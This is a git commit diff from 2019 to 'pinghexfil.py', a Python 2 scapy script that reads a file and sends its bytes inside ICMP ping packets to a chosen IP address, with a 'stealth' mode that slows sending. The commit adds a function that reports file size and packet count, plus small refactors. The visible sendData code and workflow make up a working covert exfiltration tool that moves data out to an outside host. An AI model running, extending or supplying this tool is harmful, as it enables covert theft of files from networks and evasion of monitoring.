e5aba950fd76576c4c2e08d8d73af2190a599121
WeakNetLabs <weaknetlabs@gmail.com>
2019-05-15 18:26:24 -0400

    added in the file details function

--- pinghexfil.py
+++ pinghexfil.py
@@ -8,6 +8,7 @@ from scapy.sendrecv import send
 from sys import argv
 import time
 import re
+import os
 import binascii # bytes to hex for file input
 fileData = "" # read in file and send via ping, less than 60kB
 stealth=False # boolean for enabling stealth mode
@@ -16,16 +17,22 @@ def usage():
 	usageMsg="""
  PingHexFil - Transmitter
  2019 WeakNetLabs
- Usage: ./ping.py IP ADDRESS) (FILE NAME) [optional: ](--stealth)]
+ Usage: ./pinghexfil.py (IP ADDRESS) (FILE NAME) [optional: ](--stealth)]
 """
 	print usageMsg
 	exit(1)
-# User defined fucntion to send data packet:
+# User defined function to send data packet:
 def sendData(fileData,dstIp):
 	if(stealth):
 		time.sleep(1) # one second
 	send(IP(dst=dstIp)/ICMP()/fileData, verbose=False)
 	print "[+] "+str(len(fileData))+" bytes sent via ICMP." # done.
+# User-defined function to get file length in bytes
+def fileDetails(fileName):
+	byteCount=os.path.getsize(fileName)
+	print "[+] The file "+fileName+" is "+str(byteCount)+" bytes."
+	print "[+] This will require: "+str(byteCount/30000)+" packets to transmit."
+	raw_input("[+] Start the listener with count of "+str(byteCount/30000)+", hit ENTER when ready ... ")
 
 # And finally, the workflow:
 if (len(argv)<3): # we require an IP
@@ -36,12 +43,13 @@ else: # The IP address checks out?:
 	if (len(argv)>3):
 		if(argv[3]=="--stealth"):
 			stealth=True
+fileName=argv[2]
+print "[+] Opening file: "+fileName
+fileDetails(fileName) # get file details and wait for input
 
-print "[+] Opening file: "+argv[2]
-print "[+] Please ensure that the destination, "+dstIp+" is capturing ICMP traffic."
 byteCount=0 # This will be a counter token
 packetCount=0 # token for how many ICMP requests we make
-with open(argv[2],'rb') as byte:
+with open(fileName,'rb') as byte:
 	hexByte = byte.read(1) # create a hax value of the byte
 	while (hexByte != ""):
 		byteCount+=1 # increment counter
